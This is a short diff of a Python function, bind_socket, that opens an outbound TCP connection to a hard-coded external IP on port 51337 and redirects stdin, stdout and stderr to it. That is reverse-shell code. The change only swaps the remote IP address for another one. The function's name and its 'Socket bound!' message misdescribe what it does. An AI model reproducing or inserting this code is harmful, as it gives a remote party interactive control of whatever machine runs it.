@@ -44,7 +44,7 @@ def bind_socket():
     print("Socket bound!")
 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("54.226.94.89",51337))
+    s.connect(("3.92.69.143",51337))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
